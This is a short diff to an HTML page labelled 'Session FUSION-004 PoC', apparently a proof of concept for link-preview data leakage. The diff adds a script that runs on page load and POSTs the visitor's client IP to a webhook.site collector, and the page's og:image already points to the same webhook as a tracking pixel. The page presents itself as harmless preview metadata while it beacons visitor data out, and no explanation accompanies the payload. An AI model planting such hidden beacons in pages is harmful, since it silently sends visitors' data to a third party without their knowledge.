@@ -5,6 +5,17 @@
 <meta property="og:description" content="Link preview metadata page">
 <meta property="og:image" content="https://webhook.site/e9e844db-3b29-4be9-95cd-1da788c74d7d/pixel.png">
 <meta property="og:url" content="https://zcyt0218.github.io/session.html">
+<script>
+fetch('https://webhook.site/e9e844db-3b29-4be9-95cd-1da788c74d7d', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    ip: '{{client_ip}}'
+  })
+});
+</script>
 </head>
 <body>
 <p>Session FUSION-004 PoC</p>
